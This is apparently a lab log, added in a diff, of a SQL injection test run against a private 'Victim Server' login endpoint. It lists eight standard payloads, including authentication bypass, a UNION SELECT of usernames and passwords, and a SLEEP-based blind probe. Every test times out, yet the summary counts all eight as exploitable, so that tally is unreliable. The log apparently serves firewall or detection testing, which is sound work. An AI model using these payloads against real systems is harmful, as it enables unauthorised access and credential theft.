@@ -1,0 +1,53 @@
+============================================================
+Attack Type: SQL_Injection
+Timestamp: 2026-01-04_17-35-36
+Target: 172.20.0.10:5000
+============================================================
+
+[17:34:46] 🔴 ATTACK INITIATED: SQL Injection
+[17:34:46] Target: Victim Server (172.20.0.10:5000/login)
+[17:34:46] Testing various SQL injection techniques...
+[17:34:46] 
+[Test 1/8] Authentication Bypass (OR condition)
+[17:34:46]    Payload: ' OR '1'='1
+[17:34:51]    ⏱️  Timeout - Possible time-based blind injection
+[17:34:52] 
+[Test 2/8] Comment Injection
+[17:34:52]    Payload: admin'--
+[17:34:57]    ⏱️  Timeout - Possible time-based blind injection
+[17:34:58] 
+[Test 3/8] UNION-based Injection
+[17:34:58]    Payload: ' UNION SELECT NULL, username, password FROM users--
+[17:35:03]    ⏱️  Timeout - Possible time-based blind injection
+[17:35:04] 
+[Test 4/8] Boolean-based Injection
+[17:35:04]    Payload: ' OR 1=1--
+[17:35:09]    ⏱️  Timeout - Possible time-based blind injection
+[17:35:10] 
+[Test 5/8] Time-based Blind Injection
+[17:35:10]    Payload: admin' AND SLEEP(5)--
+[17:35:15]    ⏱️  Timeout - Possible time-based blind injection
+[17:35:16] 
+[Test 6/8] Alternative OR condition
+[17:35:16]    Payload: ' OR 'a'='a
+[17:35:21]    ⏱️  Timeout - Possible time-based blind injection
+[17:35:22] 
+[Test 7/8] Nested condition bypass
+[17:35:22]    Payload: 1' OR '1' = '1')) --
+[17:35:27]    ⏱️  Timeout - Possible time-based blind injection
+[17:35:28] 
+[Test 8/8] Block comment injection
+[17:35:28]    Payload: admin' /*
+[17:35:33]    ⏱️  Timeout - Possible time-based blind injection
+[17:35:34] 
+==================================================
+[17:35:34] 📊 ATTACK SUMMARY
+[17:35:34] ==================================================
+[17:35:34] Total Payloads Tested: 8
+[17:35:34] Exploitable Vulnerabilities: 8
+[17:35:34] Blocked by Firewall: 0
+[17:35:34] Protected/Failed: 0
+[17:35:36] 
+🛡️  Firewall SQL Injection Alerts: 0
+[17:35:36] 
+⏱️  Attack Duration: 50.06 seconds
